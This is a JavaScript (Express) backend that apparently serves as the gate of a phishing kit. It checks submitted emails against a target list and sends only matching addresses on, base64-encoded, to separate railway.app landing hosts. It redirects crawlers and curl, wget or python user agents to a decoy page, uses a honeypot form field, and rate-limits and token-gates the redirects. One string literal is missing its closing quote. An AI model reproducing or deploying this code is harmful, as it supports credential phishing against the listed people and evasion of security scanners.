require('dotenv').config();
const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const fetch = require('node-fetch');
const crypto = require('crypto');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');

const app = express();
const PORT = process.env.PORT || 3000;

const EMAIL_FILE = path.join(__dirname, 'ogas', 'oga.txt');
const DEFAULT_REDIRECT_BASE = process.env.REDIRECT_BASE || 'https://kranadeyrinamnoputbod.up.railway.app';
const BACKEND_BASE = process.env.BACKEND_BASE || 'https://bbbdjfhefghnoreasonam.up.railway.app';
const DEBUG = process.env.DEBUG === 'true';

let validEmails = new Set();
let tokenMap = new Map();

// ✅ Allowed frontend domains
const allowedOrigins = [
  'https://fronahadbedisnorresoam.up.railway.app,
  'https://app2.io',
  'https://yourmainfrontend.com'
];

// ✅ CORS configuration per-origin
app.use(cors({
  origin: (origin, callback) => {
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('CORS not allowed for this origin'));
    }
  },
  credentials: true
}));

// ✅ Serve static files
app.use(express.static(path.join(__dirname)));

// ✅ Bot trap logic
app.use((req, res, next) => {
  const ua = req.headers['user-agent'] || '';
  const botIndicators = ['bot', 'crawler', 'spider', 'python', 'fetch', 'httpclient', 'wget', 'curl'];
  if (botIndicators.some(ind => ua.toLowerCase().includes(ind))) {
    return res.redirect('/xr91ee9e.html');
  }
  next();
});

// ✅ Security middleware
app.use(helmet());
app.use(express.json());

// ✅ Force HTTPS
app.use((req, res, next) => {
  if (req.headers['x-forwarded-proto'] !== 'https') {
    return res.redirect(`https://${req.headers.host}${req.url}`);
  }
  next();
});

// ✅ Load and auto-reload email list
function loadEmails() {
  try {
    const data = fs.readFileSync(EMAIL_FILE, 'utf8');
    validEmails = new Set(data.split('\n').map(e => e.trim().toLowerCase()));
    console.log('[INFO] Email list loaded');
  } catch (err) {
    console.error('[ERROR] Failed to load emails:', err);
  }
}
loadEmails();
fs.watchFile(EMAIL_FILE, () => {
  console.log('[INFO] Email list changed — reloading');
  loadEmails();
});

// ✅ Token cleanup every 5 minutes
setInterval(() => {
  const now = Date.now();
  for (const [token, info] of tokenMap.entries()) {
    if (info.expires < now) {
      tokenMap.delete(token);
      DEBUG && console.log(`[INFO] Expired token ${token} cleared`);
    }
  }
}, 5 * 60 * 1000);

// ✅ Rate limiting
app.use(rateLimit({
  windowMs: 60 * 1000,
  max: 300,
  message: { valid: false, message: 'Too many requests. Try again later.' }
}));

// ✅ Email validation and redirect generation
app.post('/api/check-email', async (req, res) => {
  const { email, middleName } = req.body;
  const origin = req.headers.origin;

  if (middleName && middleName.trim() !== '') {
    return res.status(403).json({ valid: false, message: 'Bot activity detected' });
  }

  if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
    return res.status(400).json({ valid: false, message: 'Enter a valid email address' });
  }

  const normalized = email.toLowerCase();
  if (!validEmails.has(normalized)) {
    return res.status(404).json({ valid: false, message: 'Email not recognized' });
  }

  const token = crypto.randomBytes(16).toString('hex');
  const encoded = Buffer.from(normalized).toString('base64');

  const existing = Array.from(tokenMap.entries()).find(([_, v]) => v.email === encoded);
  if (existing) {
    tokenMap.delete(existing[0]);
    DEBUG && console.log(`[INFO] Replacing previous token for ${normalized}`);
  }

  tokenMap.set(token, { email: encoded, expires: Date.now() + 5 * 60 * 1000 });

  // ✅ Set redirect based on origin
  let redirectBase = DEFAULT_REDIRECT_BASE;
  if (origin === 'https://fronahadbedisnorresoam.up.railway.app') redirectBase = 'https://kranaskranasra.up.railway.app';
  if (origin === 'https://app2.io') redirectBase = 'https://kranaskranasra.up.railway.app';
 

  const redirectUrl = `${redirectBase}/#${encoded}`;
  return res.json({ valid: true, redirectUrl });
});

// ✅ Token-based redirect
app.get('/forward', (req, res) => {
  const { token } = req.query;
  const entry = tokenMap.get(token);

  if (!entry || Date.now() > entry.expires) {
    tokenMap.delete(token);
    return res.status(403).send('Invalid or expired token.');
  }

  const finalUrl = `${DEFAULT_REDIRECT_BASE}/#${entry.email}`;
  tokenMap.delete(token);
  res.redirect(finalUrl);
});

app.listen(PORT, () => {
  console.log(`[READY] Backend running on port ${PORT}`);
});
